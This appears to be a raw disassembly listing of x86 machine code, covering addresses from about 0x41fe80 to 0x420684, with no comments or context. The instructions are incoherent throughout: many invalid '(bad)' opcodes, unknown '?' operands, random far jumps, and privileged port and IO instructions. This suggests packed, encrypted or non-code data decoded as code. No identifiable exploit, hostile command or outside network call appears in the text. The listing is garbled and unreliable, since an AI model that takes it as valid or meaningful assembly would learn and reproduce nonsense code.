  41fe80:	sbb    dl,BYTE PTR [ebp+0x6b]
  41fe83:	les    esi,FWORD PTR [esi-0x80]
  41fe86:	ds and al,0x48
  41fe89:	jo     0x41feec
  41fe8b:	cli    
  41fe8c:	pop    esi
  41fe8d:	push   0x77516629
  41fe92:	mov    ebp,0x1480198f
  41fe97:	icebp  
  41fe98:	loopne 0x41fe25
  41fe9a:	mov    eax,0xf8c65b2c
  41fe9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fea0:	xchg   ebx,eax
  41fea1:	scas   al,BYTE PTR es:[edi]
  41fea2:	push   ebp
  41fea3:	push   edi
  41fea4:	xor    al,0xfc
  41fea6:	ret    0x8d13
  41fea9:	mov    esi,0x97240a29
  41feae:	dec    ebp
  41feaf:	popa   
  41feb0:	int    0xd0
  41feb2:	jg     0x41fe64
  41feb4:	mov    cl,0xc8
  41feb6:	jmp    0x2d205414
  41febb:	jnp    0x41fed0
  41febd:	test   al,0xdf
  41febf:	mov    bh,0x7d
  41fec1:	add    al,0xa4
  41fec3:	dec    eax
  41fec4:	sahf   
  41fec5:	fild   QWORD PTR ds:0x2d9c739a
  41fecb:	adc    DWORD PTR [edi],eax
  41fecd:	jmp    0xf81b8f9a
  41fed2:	std    
  41fed3:	adc    ah,BYTE PTR [esi+0x58daeb27]
  41fed9:	push   eax
  41feda:	out    0xc3,al
  41fedc:	arpl   WORD PTR [ebx-0x39],bx
  41fedf:	(bad)  
  41fee0:	jne    0x41ff07
  41fee2:	ss aam 0xa9
  41fee5:	pop    ecx
  41fee6:	xchg   edx,eax
  41fee7:	sub    DWORD PTR [edx],0x771e143c
  41feed:	inc    ecx
  41feee:	and    bl,BYTE PTR [ecx+0x5b81fb7a]
  41fef4:	push   ecx
  41fef5:	push   edx
  41fef6:	xchg   ebx,eax
  41fef7:	aas    
  41fef8:	js     0x41ff5f
  41fefa:	mov    ah,BYTE PTR [eax+0x6]
  41fefd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fefe:	sahf   
  41feff:	inc    ebx
  41ff00:	dec    ebx
  41ff01:	ja     0x41ff70
  41ff03:	daa    
  41ff04:	dec    edx
  41ff05:	jle    0x41ff00
  41ff07:	sbb    eax,eax
  41ff09:	cmp    BYTE PTR [ebp-0x1d53cc46],ah
  41ff0f:	or     eax,ecx
  41ff11:	push   ecx
  41ff12:	jno    0x41fe98
  41ff14:	and    ah,BYTE PTR [ebx+0x36297a3c]
  41ff1a:	mov    WORD PTR [esi+0x5c],fs
  41ff1d:	dec    esp
  41ff1e:	fadd   QWORD PTR [ebx+0x1e]
  41ff21:	stos   BYTE PTR es:[edi],al
  41ff22:	loop   0x41fed1
  41ff24:	xor    BYTE PTR [eax+0x37],ch
  41ff27:	(bad)  [edx]
  41ff29:	(bad)  
  41ff2a:	mov    bh,0xa
  41ff2c:	sub    esp,ebx
  41ff2e:	or     edx,DWORD PTR [ebx-0x1a85509]
  41ff34:	fwait
  41ff35:	das    
  41ff36:	pop    edi
  41ff37:	xchg   esp,eax
  41ff38:	enter  0xdfcb,0xa5
  41ff3c:	fstp   TBYTE PTR [esi-0x45e82b69]
  41ff42:	add    eax,0xc6803d
  41ff47:	(bad)
  41ff4b:	xchg   esp,eax
  41ff4c:	xchg   ecx,eax
  41ff4d:	add    eax,0xb01bfcaf
  41ff52:	pop    eax
  41ff53:	stos   DWORD PTR es:[edi],eax
  41ff54:	and    cl,ah
  41ff56:	jl     0x41ffd4
  41ff58:	or     dl,dl
  41ff5a:	jns    0x41ffaa
  41ff5c:	mov    bl,0x50
  41ff5e:	(bad)  
  41ff5f:	jo     0x41ff15
  41ff61:	lds    edx,FWORD PTR [ebx]
  41ff63:	mov    ds:0x8fbf04cf,eax
  41ff68:	or     esi,edx
  41ff6a:	daa    
  41ff6b:	jmp    0x41ffd8
  41ff6d:	scas   al,BYTE PTR es:[edi]
  41ff6e:	xchg   ebp,eax
  41ff6f:	xchg   ecx,eax
  41ff70:	mov    edx,0x387ed8c2
  41ff75:	add    BYTE PTR [ecx+0x5],ch
  41ff78:	jbe    0x41ffe8
  41ff7a:	clc    
  41ff7b:	les    ebx,FWORD PTR [edi+0x211bdfa9]
  41ff81:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff83:	test   DWORD PTR ds:0x7b40ae2c,ebp
  41ff89:	sar    BYTE PTR ds:0x62603aa8,cl
  41ff8f:	inc    ecx
  41ff90:	mov    cl,0x54
  41ff92:	sbb    edi,ecx
  41ff94:	and    ecx,DWORD PTR [edi*4-0x6540ffa8]
  41ff9b:	inc    ecx
  41ff9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff9d:	ret    0xb972
  41ffa0:	fwait
  41ffa1:	xchg   edx,eax
  41ffa2:	adc    eax,0xa23971
  41ffa7:	mov    ch,0x9e
  41ffa9:	mov    ch,0xd2
  41ffab:	out    0xf9,al
  41ffad:	cmp    esp,esi
  41ffaf:	adc    al,0x17
  41ffb1:	nop
  41ffb2:	jae    0x41ff90
  41ffb4:	adc    al,0xec
  41ffb6:	jnp    0x41fff8
  41ffb8:	out    0x61,eax
  41ffba:	mov    eax,ds:0x2c4ed098
  41ffbf:	ror    BYTE PTR ds:[edx],cl
  41ffc2:	jmp    0xff0f:0xd600d631
  41ffc9:	inc    ecx
  41ffca:	test   al,0x89
  41ffcc:	mov    ?,WORD PTR [ebp-0x63e35d14]
  41ffd2:	call   0xe1ff8b7
  41ffd7:	lea    esp,[ebx-0x4a]
  41ffda:	jp     0x420057
  41ffdc:	out    dx,eax
  41ffdd:	sub    edi,ebp
  41ffdf:	or     BYTE PTR [ebp+0x32a614e1],dh
  41ffe5:	rep ins DWORD PTR es:[edi],dx
  41ffe7:	rol    BYTE PTR ds:0x96537868,cl
  41ffed:	push   0x6cfcf9d6
  41fff2:	ffree  st(7)
  41fff4:	cmp    BYTE PTR [eax-0x11b3d7dc],0xff
  41fffb:	pshufw mm3,QWORD PTR [ecx+ecx*4],0x73
  420000:	xor    al,0xf9
  420002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420003:	xchg   edi,eax
  420004:	ret    
  420005:	(bad)  
  420006:	ficom  WORD PTR [ecx]
  420008:	mov    ds:0xcb7a132b,eax
  42000d:	mov    dl,BYTE PTR [edi]
  42000f:	push   ss
  420010:	sub    al,0x6c
  420012:	stos   BYTE PTR es:[edi],al
  420013:	sbb    al,0x25
  420015:	push   ebp
  420016:	in     al,dx
  420017:	adc    ecx,esi
  420019:	addr16 mov eax,ds:0xaf11
  42001d:	dec    esi
  42001e:	xor    BYTE PTR [eax-0x75],dh
  420021:	mov    WORD PTR [edx-0x6693872f],es
  420027:	xor    ah,BYTE PTR [esi+0x37]
  42002a:	sbb    ecx,DWORD PTR [ebx-0x4d]
  42002d:	push   eax
  42002e:	dec    ebx
  42002f:	mov    ds,WORD PTR [ebx-0x77]
  420032:	ins    DWORD PTR es:[edi],dx
  420033:	cmp    al,0xf8
  420035:	pusha  
  420036:	pop    ss
  420037:	ss push 0xffffff94
  42003a:	lea    edx,[edi+0x736540b0]
  420040:	int3   
  420041:	push   esp
  420042:	mov    DWORD PTR [ecx+0x2f],ecx
  420045:	mov    al,ds:0x1c66e305
  42004a:	and    eax,0xbcd8331
  42004f:	sti    
  420050:	lock jmp 0x33054690
  420056:	mov    bl,0xe4
  420058:	std    
  420059:	push   ecx
  42005a:	mov    bh,0x63
  42005c:	mov    ecx,0x59e8719e
  420061:	or     BYTE PTR [eax+0x4f],0xf8
  420065:	xchg   esi,eax
  420066:	xchg   esp,eax
  420067:	leave  
  420068:	pop    edi
  420069:	fidiv  WORD PTR [eax]
  42006b:	stos   BYTE PTR es:[edi],al
  42006c:	mov    BYTE PTR [ebx-0x717dd08e],dh
  420072:	arpl   WORD PTR ds:[edi+esi*2-0x63],bx
  420077:	adc    DWORD PTR [ebx-0x19],ebp
  42007a:	cmp    edi,DWORD PTR [esi+eiz*1]
  42007d:	and    ecx,DWORD PTR [eax-0x70]
  420080:	jne    0x4200aa
  420082:	add    eax,0x71af7282
  420087:	fimul  DWORD PTR [edx-0x34ce9fd0]
  42008d:	xor    edi,ebp
  42008f:	pusha  
  420090:	mov    ecx,0x1f83d863
  420095:	fbld   TBYTE PTR [esi+0x557be6dd]
  42009b:	shl    BYTE PTR [ebx],0x70
  42009e:	gs pop ds
  4200a0:	inc    edi
  4200a1:	dec    ebp
  4200a2:	mov    bh,0xe
  4200a4:	cld    
  4200a5:	cmp    ebp,esp
  4200a7:	xor    DWORD PTR ds:0xfb3eb6d6,edi
  4200ad:	mov    al,0x50
  4200af:	ror    BYTE PTR [ecx-0xb],0x7e
  4200b3:	inc    ebx
  4200b4:	inc    esi
  4200b5:	(bad)  
  4200b7:	imul   esi,DWORD PTR [ecx],0x823aa8b5
  4200bd:	in     al,dx
  4200be:	xor    eax,0x221020ab
  4200c3:	mov    cl,0x52
  4200c5:	fisubr DWORD PTR [ebx+0x33]
  4200c8:	jg     0x42013e
  4200ca:	jmp    0x42007f
  4200cc:	push   ecx
  4200cd:	not    DWORD PTR [esi]
  4200cf:	mov    al,ds:0xf7bde9fa
  4200d4:	call   0x2440:0xc81ddbce
  4200db:	jmp    0x3880:0x90772fa3
  4200e2:	mov    ebp,DWORD PTR [ecx]
  4200e4:	mov    esi,0xd7cb2059
  4200e9:	aam    0xd8
  4200eb:	dec    ecx
  4200ec:	fstp   QWORD PTR [esi]
  4200ee:	push   edi
  4200ef:	icebp  
  4200f0:	js     0x4200d5
  4200f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f3:	cmp    eax,0xa000ae6d
  4200f8:	mov    ds:0x102bed92,al
  4200fd:	or     eax,0x9f8a576e
  420102:	in     al,dx
  420103:	ja     0x4200cc
  420105:	dec    ebx
  420106:	je     0x42013e
  420108:	adc    ebp,DWORD PTR [ecx-0xb]
  42010b:	fstp   TBYTE PTR [ebp-0x3d]
  42010e:	(bad)  
  42010f:	mov    ecx,ebx
  420111:	mov    dl,0xb3
  420113:	lock push 0x82e9ff8c
  420119:	ds ins BYTE PTR es:[edi],dx
  42011b:	stos   DWORD PTR es:[edi],eax
  42011c:	out    dx,eax
  42011d:	lods   al,BYTE PTR ds:[esi]
  42011e:	mov    bl,0xf1
  420120:	pop    ds
  420121:	cwde   
  420122:	ret    0x202c
  420125:	ins    DWORD PTR es:[edi],dx
  420126:	push   edi
  420127:	cmc    
  420128:	(bad)  
  420129:	mov    ds:0x6f9d37b5,al
  42012e:	jle    0x4200bc
  420130:	or     al,0x7e
  420132:	pop    ecx
  420133:	jmp    FWORD PTR [ebp+edx*2+0x4962db13]
  42013a:	jmp    0x48fb9e9c
  42013f:	call   0x5ed34702
  420144:	xchg   edi,eax
  420145:	sub    DWORD PTR [edx+0xe],eax
  420148:	inc    esi
  420149:	cmp    DWORD PTR [ecx],esp
  42014b:	clc    
  42014c:	mov    edi,0x6c8eec89
  420151:	adc    DWORD PTR [esi+0x61],esp
  420154:	sbb    DWORD PTR [esi-0x1ce7cee1],esi
  42015a:	push   0xffffff8e
  42015c:	xor    edi,DWORD PTR [ebx]
  42015e:	mov    ah,BYTE PTR [edx+ebp*4-0xa8352cd]
  420165:	es sub ch,0xe2
  420169:	inc    edx
  42016a:	dec    ecx
  42016b:	fimul  DWORD PTR [edx+0x6659a216]
  420171:	push   ebp
  420172:	adc    bh,bl
  420174:	ds mov es,ecx
  420177:	pop    es
  420178:	inc    eax
  420179:	mov    ds:0x5be4a678,al
  42017e:	mov    ds:0x2e4a8a47,eax
  420183:	xor    dh,BYTE PTR [ecx]
  420185:	add    BYTE PTR [eax],al
  420187:	add    BYTE PTR [eax],al
  420189:	add    BYTE PTR [ecx+0x57],bl
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx+0x2a],esi
  420197:	ret    0xd283
  42019a:	fst    DWORD PTR [eax+0x6830001]
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	sbb    esi,DWORD PTR es:[esi]
  4201a5:	fnstsw WORD PTR [ebp+ecx*1-0x70]
  4201a9:	js     0x4201f6
  4201ab:	mov    bl,cl
  4201ad:	rcl    ecx,cl
  4201af:	xor    eax,0xd4a82274
  4201b4:	xrelease xchg DWORD PTR [eax],eax
  4201b7:	push   ebp
  4201b8:	inc    esp
  4201b9:	addr16 loope 0x4201e0
  4201bc:	sbb    eax,0xc06e1e66
  4201c1:	mov    ds:0xd89ac42,eax
  4201c6:	and    dh,BYTE PTR [ebx-0x30ecd98c]
  4201cc:	push   cs
  4201cd:	jg     0x420150
  4201cf:	in     al,dx
  4201d0:	dec    ecx
  4201d1:	mov    DWORD PTR [edi],ebx
  4201d3:	xor    bl,BYTE PTR [ecx-0x7f3ec476]
  4201d9:	cmp    eax,0xf5141cb7
  4201de:	inc    ebp
  4201df:	cli    
  4201e0:	add    bh,ch
  4201e2:	shr    esp,0xe3
  4201e5:	dec    eax
  4201e6:	mov    bl,0xfe
  4201e8:	dec    ecx
  4201e9:	retf   0xf374
  4201ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ed:	push   ss
  4201ee:	fwait
  4201ef:	jle    0x420227
  4201f1:	mov    al,0xfd
  4201f3:	jnp    0x420218
  4201f5:	outs   dx,BYTE PTR ds:[esi]
  4201f6:	data16 add BYTE PTR [esp+ebp*1],cl
  4201fa:	dec    edx
  4201fb:	in     al,0x26
  4201fd:	push   edx
  4201fe:	pop    ecx
  4201ff:	test   al,0x1f
  420201:	fist   DWORD PTR [edx+0xa]
  420204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420205:	pushf  
  420206:	inc    ebp
  420207:	cmc    
  420208:	push   edi
  420209:	leave  
  42020a:	lahf   
  42020b:	mov    dh,0x42
  42020d:	jle    0x4201dc
  42020f:	mov    ah,0xc0
  420211:	lahf   
  420212:	xor    ebx,DWORD PTR [esi-0x27902668]
  420218:	push   0x4a35bdad
  42021d:	test   al,0xc4
  42021f:	mov    bl,0xb2
  420221:	mov    BYTE PTR [edx+ebx*1],al
  420224:	scas   al,BYTE PTR es:[edi]
  420225:	pushf  
  420226:	mov    bh,0x50
  420228:	push   ebp
  420229:	imul   edi,ecx
  42022c:	pop    ebp
  42022d:	jle    0x420201
  42022f:	clc    
  420230:	cmp    BYTE PTR [ebx],ch
  420232:	jmp    DWORD PTR ds:0x89be3398
  420238:	int    0x7
  42023a:	sahf   
  42023b:	mov    ?,WORD PTR [eax+0x432604ab]
  420241:	add    al,0x90
  420243:	jl     0x4201ee
  420245:	rol    al,0xf8
  420248:	dec    ebp
  420249:	mov    bh,0x69
  42024b:	xchg   ecx,eax
  42024c:	sbb    eax,0xe8f9f38f
  420251:	(bad)
  420255:	loop   0x420212
  420257:	jae    0x42029e
  420259:	outs   dx,DWORD PTR ds:[esi]
  42025a:	pop    ecx
  42025b:	xchg   esp,eax
  42025c:	(bad)  
  42025d:	(bad)  
  42025e:	repnz sar cl,1
  420261:	dec    esi
  420263:	out    dx,al
  420264:	bound  eax,QWORD PTR [edi+0x3a8a87e9]
  42026a:	cli    
  42026b:	(bad)  
  42026c:	arpl   di,bx
  42026e:	js     0x42024f
  420270:	sbb    esi,DWORD PTR [edi]
  420272:	call   0x82e95046
  420277:	hlt    
  420278:	mov    dl,0xfc
  42027a:	retf   0xc911
  42027d:	daa    
  42027e:	es (bad) 
  420280:	jge    0x4202d6
  420282:	clc    
  420283:	and    DWORD PTR [edi-0x75],esp
  420286:	aam    0xc0
  420288:	icebp  
  420289:	mov    bl,BYTE PTR [esi]
  42028b:	(bad)  
  42028c:	pushf  
  42028d:	push   ecx
  42028e:	in     al,dx
  42028f:	data16 (bad) 
  420291:	mov    eax,ds:0x4cbe8124
  420296:	hlt    
  420297:	test   DWORD PTR [ebx+eax*2-0x6633f17e],eax
  42029e:	mov    ebp,0x273bcee7
  4202a3:	ret    0x6187
  4202a6:	mov    bl,0xcb
  4202a8:	loope  0x420241
  4202aa:	jne    0x420287
  4202ac:	hlt    
  4202ad:	rol    BYTE PTR [esp+ebp*2+0xe60c93f],1
  4202b4:	pop    edx
  4202b5:	sub    BYTE PTR [ebp+0x69],ch
  4202b8:	ins    DWORD PTR es:[edi],dx
  4202b9:	fdiv   st,st(3)
  4202bb:	aam    0xe4
  4202bd:	add    DWORD PTR [ebp-0x7c7fbc59],esi
  4202c3:	hlt    
  4202c4:	sbb    BYTE PTR [edx+0x72e4241c],0x11
  4202cb:	pop    es
  4202cc:	jmp    0xe3566bb7
  4202d1:	and    dl,cl
  4202d3:	es or  al,0x9f
  4202d6:	rol    ebp,0x3b
  4202d9:	sub    DWORD PTR [edi+0x10],ebx
  4202dc:	sub    ebp,DWORD PTR [ecx+edi*1-0x22]
  4202e0:	cdq    
  4202e1:	jmp    0x4202a3
  4202e3:	and    eax,0xf73fe9a4
  4202e8:	fiadd  DWORD PTR [esp+edx*4-0x48]
  4202ec:	push   0x43210ab7
  4202f1:	sub    edi,DWORD PTR [esi+eiz*4-0x76033939]
  4202f8:	adc    al,0x80
  4202fa:	pop    edi
  4202fb:	pop    esp
  4202fc:	and    cl,BYTE PTR [ebp-0x73]
  4202ff:	inc    ecx
  420300:	mov    al,ds:0xedc1c31b
  420305:	pop    edi
  420306:	push   0x7b14924a
  42030b:	les    ecx,FWORD PTR [edi+0x6]
  42030e:	repz inc esi
  420310:	mov    WORD PTR [ebx-0x22],?
  420313:	std    
  420314:	mov    al,0x4
  420316:	fidiv  WORD PTR [ecx+ebp*4]
  420319:	jnp    0x420304
  42031b:	fsubr  QWORD PTR [ebp+ebp*1+0x53]
  42031f:	pop    edx
  420320:	inc    ecx
  420321:	test   BYTE PTR ds:0xf293b2f2,dh
  420327:	jp     0x420347
  420329:	or     BYTE PTR [ebx+0x609bbaf5],bl
  42032f:	outs   dx,DWORD PTR ds:[esi]
  420330:	push   ebx
  420331:	cmp    DWORD PTR [edi+ebx*8+0x1e],esp
  420335:	xor    eax,0x4a150e0e
  42033a:	test   DWORD PTR [esi],esi
  42033c:	mov    ds:0x5d218b1f,eax
  420341:	imul   ebp,DWORD PTR [ebp+edi*4-0x19],0x47bc94cb
  420349:	mov    cs,WORD PTR [ecx+0x5eea776a]
  42034f:	aaa    
  420350:	shr    DWORD PTR [ecx+0x1d9de4b7],0x74
  420357:	pushf  
  420358:	add    BYTE PTR [ecx-0xa8666bf],bh
  42035e:	push   esp
  42035f:	mov    cl,0xd9
  420361:	and    ch,bh
  420363:	inc    edi
  420364:	mov    ch,0x11
  420366:	xor    bl,BYTE PTR [ebp-0x60]
  420369:	jl     0x4203e5
  42036b:	push   0x2c
  42036d:	ror    dl,cl
  42036f:	arpl   WORD PTR [ebp-0x5e],di
  420372:	mov    ds:0xc76959fe,al
  420377:	call   0x9298ca45
  42037c:	popf   
  42037d:	test   dh,al
  42037f:	push   esp
  420380:	ror    DWORD PTR [ecx-0x73869990],cl
  420386:	sub    al,BYTE PTR [edx+0x22]
  420389:	mov    eax,0x5f84ed8b
  42038e:	push   esi
  42038f:	jns    0x420355
  420391:	fld    QWORD PTR [esi]
  420393:	push   ds
  420394:	ja     0x420392
  420396:	xchg   esp,eax
  420397:	das    
  420398:	leave  
  420399:	mov    ebp,0x703ee4c9
  42039e:	gs dec ecx
  4203a0:	xchg   esp,eax
  4203a1:	mov    DWORD PTR [edi+edi*4-0x76],esp
  4203a5:	in     eax,0xd8
  4203a7:	push   ds
  4203a8:	and    bl,bh
  4203aa:	jle    0x420331
  4203ac:	ja     0x42036c
  4203ae:	cs (bad) 
  4203b1:	sub    edx,DWORD PTR [ebx-0x70]
  4203b4:	and    BYTE PTR [edi+0x19f7b377],dl
  4203ba:	pop    ebp
  4203bb:	add    al,0xaf
  4203bd:	mov    bl,0xd8
  4203bf:	mov    eax,ds:0x8c3aa1a2
  4203c4:	repz inc ecx
  4203c6:	ret    0x34e0
  4203c9:	rcr    DWORD PTR ds:0x83cc6874,cl
  4203cf:	es pop ss
  4203d1:	mov    al,ds:0x939209a1
  4203d6:	jns    0x4203ef
  4203d8:	mov    esi,0xa27dc353
  4203dd:	adc    al,0xd3
  4203df:	pop    ecx
  4203e0:	add    eax,0x3f40e7bf
  4203e5:	stos   BYTE PTR es:[edi],al
  4203e6:	add    DWORD PTR [ebx-0x4ec97229],edi
  4203ec:	xor    edx,DWORD PTR [edx]
  4203ee:	ins    BYTE PTR es:[edi],dx
  4203ef:	xor    DWORD PTR [ecx],0x283c9ce8
  4203f5:	and    BYTE PTR [ebx],bl
  4203f7:	mov    edi,0x855c1e2e
  4203fc:	arpl   WORD PTR ds:[edi-0x80],di
  420400:	cs call 0x79dd4f38
  420406:	cmp    BYTE PTR [eax+0x17],bh
  420409:	in     al,0x92
  42040b:	lahf   
  42040c:	xor    eax,0x2307e3e9
  420411:	xor    dh,BYTE PTR [edi+ecx*4-0x4462161c]
  420418:	and    BYTE PTR [edi],dh
  42041a:	ja     0x420463
  42041c:	iret   
  42041d:	pop    esi
  42041e:	mov    al,ds:0x507da401
  420423:	adc    dh,BYTE PTR [ecx+eiz*2-0x24cdb4d7]
  42042a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42042b:	xchg   esi,eax
  42042c:	push   edx
  42042d:	or     esp,DWORD PTR [ebx-0x1e]
  420430:	sar    DWORD PTR [edx],1
  420432:	call   0x247f:0x961ee3fe
  420439:	mov    bl,0x4f
  42043b:	add    cl,cl
  42043d:	adc    al,0x60
  42043f:	mov    esp,0x15434fc2
  420444:	lea    esp,[ebp-0x4b124196]
  42044a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42044b:	jno    0x4203fb
  42044d:	nop
  42044e:	jge    0x420460
  420450:	in     al,0xdf
  420452:	and    al,0x27
  420454:	jg     0x4204a6
  420456:	lods   eax,DWORD PTR ds:[esi]
  420457:	lahf   
  420458:	cmp    esp,DWORD PTR [ebp+0x2ed7f3e1]
  42045e:	in     eax,dx
  42045f:	and    DWORD PTR [edi-0x17668242],edi
  420465:	(bad)  
  420466:	dec    ebx
  420467:	cmp    BYTE PTR [edi],cl
  420469:	add    BYTE PTR [ecx+esi*2-0x2f4357e5],0x6
  420471:	fmul   QWORD PTR [edi-0x6c]
  420474:	mov    esi,0xc6d71db8
  420479:	and    ebp,DWORD PTR [eax+0x2d]
  42047c:	sub    dl,BYTE PTR [esi-0x72]
  42047f:	xchg   edi,eax
  420480:	pop    eax
  420481:	add    eax,0x57a0410e
  420486:	mov    edi,0xd0018e3
  42048b:	fsubr  DWORD PTR [edi+0x793784a2]
  420491:	inc    ecx
  420492:	ret    0x6003
  420495:	repnz mov ch,0x12
  420498:	cli    
  420499:	es int3 
  42049b:	xor    ebp,esi
  42049d:	mov    cl,0xb2
  42049f:	add    al,0x1a
  4204a1:	or     bh,BYTE PTR [edi+ecx*8+0x61]
  4204a5:	cmp    bh,BYTE PTR [ebx-0x48f04921]
  4204ab:	daa    
  4204ac:	outs   dx,DWORD PTR ds:[esi]
  4204ad:	int    0xbe
  4204af:	cdq    
  4204b0:	out    dx,al
  4204b1:	jge    0x42047f
  4204b3:	icebp  
  4204b4:	sub    eax,0xaca9151f
  4204b9:	loope  0x420483
  4204bb:	pusha  
  4204bc:	pop    ss
  4204bd:	pop    ebx
  4204be:	sti    
  4204bf:	mov    esi,0x5578625f
  4204c4:	or     eax,0xfc44c7bc
  4204c9:	pushf  
  4204ca:	mov    ebp,edi
  4204cc:	xchg   dh,dl
  4204ce:	outs   dx,BYTE PTR ds:[esi]
  4204cf:	or     al,0xdb
  4204d1:	pop    ebp
  4204d2:	mov    al,ds:0x7441515d
  4204d7:	push   eax
  4204d8:	iret   
  4204d9:	mov    bh,0x3d
  4204db:	or     edx,DWORD PTR [edx]
  4204dd:	sub    eax,0x73a3eb99
  4204e2:	xor    ebp,ebp
  4204e4:	das    
  4204e5:	push   esi
  4204e6:	leave  
  4204e7:	xchg   ebx,eax
  4204e8:	jmp    0xb2c7:0x4a757443
  4204ef:	dec    BYTE PTR [ebx]
  4204f1:	mov    ecx,0xe0fe7e51
  4204f6:	je     0x4204f0
  4204f8:	mov    edx,0x60ac6994
  4204fd:	cmc    
  4204fe:	sub    DWORD PTR [ecx+0x5],edx
  420501:	fstp   DWORD PTR [ecx+eiz*2+0x4507a230]
  420508:	jne    0x420517
  42050a:	arpl   WORD PTR [ecx+0x72f7e4b],ax
  420510:	or     eax,0x7232811
  420515:	mov    ah,0xf
  420517:	jg     0x4204e0
  420519:	lods   al,BYTE PTR ds:[esi]
  42051a:	mov    ah,dh
  42051c:	fisubr WORD PTR [edx-0x4f62d7c1]
  420522:	je     0x420566
  420524:	sar    BYTE PTR [eax+ecx*2-0xd],1
  420528:	mov    fs,WORD PTR [eax]
  42052a:	add    ah,BYTE PTR [ebx+0x740dc661]
  420530:	xor    ch,BYTE PTR [esi+ebx*1-0x77]
  420534:	sbb    al,BYTE PTR [edx-0x3c0adbc]
  42053a:	xor    DWORD PTR [edi-0x6cc6f83b],ebp
  420540:	pusha  
  420541:	out    0x21,eax
  420543:	dec    edx
  420544:	sbb    eax,0x49ebbf51
  420549:	aam    0xa9
  42054b:	(bad)  
  42054c:	in     eax,0x9a
  42054e:	jbe    0x420505
  420550:	pop    ecx
  420551:	test   eax,ecx
  420553:	ret    
  420554:	scas   eax,DWORD PTR es:[edi]
  420555:	mov    edx,0x69e1ef27
  42055a:	cmp    al,0x22
  42055c:	bound  eax,QWORD PTR [ecx+0x45]
  42055f:	or     al,0x13
  420561:	arpl   WORD PTR [ecx+edi*8+0x7d],dx
  420565:	pop    edi
  420566:	leave  
  420567:	push   esp
  420568:	dec    ebp
  420569:	popf   
  42056a:	push   ecx
  42056b:	mov    ch,0x11
  42056d:	inc    esp
  42056e:	pop    ebx
  42056f:	add    BYTE PTR [edi-0x762de334],0x8e
  420576:	enter  0x1659,0x3d
  42057a:	fidiv  WORD PTR ds:0xbaa8dc3d
  420580:	mov    dh,0xe1
  420582:	sub    bl,BYTE PTR [edi+esi*4-0x17]
  420586:	aam    0x97
  420588:	lds    edx,FWORD PTR [ebx]
  42058a:	xchg   ebx,eax
  42058b:	aas    
  42058c:	cmp    dh,BYTE PTR [ebx+0x7a02f660]
  420592:	repz out 0xa5,eax
  420595:	sub    ecx,DWORD PTR [eax]
  420597:	mul    BYTE PTR [eax-0x64]
  42059a:	jnp    0x420573
  42059c:	fsin   
  42059e:	inc    ebp
  42059f:	dec    ecx
  4205a0:	sbb    DWORD PTR [eax],edi
  4205a2:	sub    eax,0xce737df1
  4205a7:	xchg   BYTE PTR [ebx+edi*4-0x1d763e07],al
  4205ae:	mov    ebp,DWORD PTR [edi]
  4205b0:	loop   0x42055a
  4205b2:	pusha  
  4205b3:	cmp    BYTE PTR [ebx],al
  4205b5:	mov    ds:0x622d0aae,al
  4205ba:	in     eax,0xc
  4205bc:	add    esi,ebx
  4205be:	mov    ds:0x449397b4,eax
  4205c3:	push   ebx
  4205c4:	jmp    0x82c85132
  4205c9:	pusha  
  4205ca:	aas    
  4205cb:	ja     0x420638
  4205cd:	adc    eax,0x5c57a71
  4205d2:	mov    ebx,0x2c967bce
  4205d7:	fcmovnu st,st(4)
  4205d9:	ficom  WORD PTR [ebp-0x7fd9566a]
  4205df:	mov    ch,0x9f
  4205e1:	dec    edi
  4205e2:	cld    
  4205e3:	dec    eax
  4205e4:	push   ebx
  4205e5:	stos   DWORD PTR es:[edi],eax
  4205e6:	and    ch,al
  4205e8:	shl    DWORD PTR [edx-0x47],cl
  4205eb:	or     al,0xe3
  4205ed:	mov    ch,0xe8
  4205ef:	mov    ?,WORD PTR [edx+ebx*2]
  4205f2:	sbb    DWORD PTR [ecx],ebx
  4205f4:	cli    
  4205f5:	add    al,al
  4205f7:	jle    0x420609
  4205f9:	ficom  WORD PTR [ebx+0x200cdbfc]
  4205ff:	mov    ds:0x5c1661e7,eax
  420604:	(bad)  
  420605:	fsubr  QWORD PTR [ecx-0x19]
  420608:	ins    DWORD PTR es:[edi],dx
  420609:	out    dx,eax
  42060a:	mov    eax,0xc294626a
  42060f:	add    BYTE PTR [esi-0x2f],al
  420612:	fdivr  QWORD PTR [eax+0x6468bc95]
  420618:	pop    esi
  420619:	std    
  42061a:	cmp    DWORD PTR [eax-0x16],ebp
  42061d:	adc    DWORD PTR [esi-0x2b],ebx
  420620:	cs inc ebx
  420622:	imul   edi,DWORD PTR [ebp+0x22],0xdd65021e
  420629:	retf   0xd2b3
  42062c:	jbe    0x4205d4
  42062e:	(bad)  
  420630:	jmp    0xbdac:0xed67f859
  420637:	push   edi
  420638:	inc    ecx
  420639:	push   eax
  42063a:	pop    edx
  42063b:	jmp    0xb585fb84
  420640:	outs   dx,DWORD PTR ds:[esi]
  420641:	push   0xe51609f2
  420646:	push   0xa92adfdd
  42064b:	ins    DWORD PTR es:[edi],dx
  42064c:	jo     0x4206a8
  42064e:	add    eax,0xa2266499
  420653:	jle    0x420695
  420655:	mov    esi,0xeff0577a
  42065a:	int3   
  42065b:	fwait
  42065c:	retf   
  42065d:	and    esp,esi
  42065f:	mov    ds:0xa57b5810,eax
  420664:	fistp  WORD PTR [ebx+0x5069f395]
  42066a:	test   BYTE PTR [ebx+0x154b433e],bh
  420670:	sar    DWORD PTR [eax+ebx*8+0x1],cl
  420674:	jmp    0xd3cf:0x25e7766f
  42067b:	sahf   
  42067c:	push   esp
  42067d:	fcmovb st,st(1)
  42067f:	and    al,0x39
  420681:	scas   al,BYTE PTR es:[edi]
  420682:	loopne 0x420639
  420684:	sub    al,0x4d
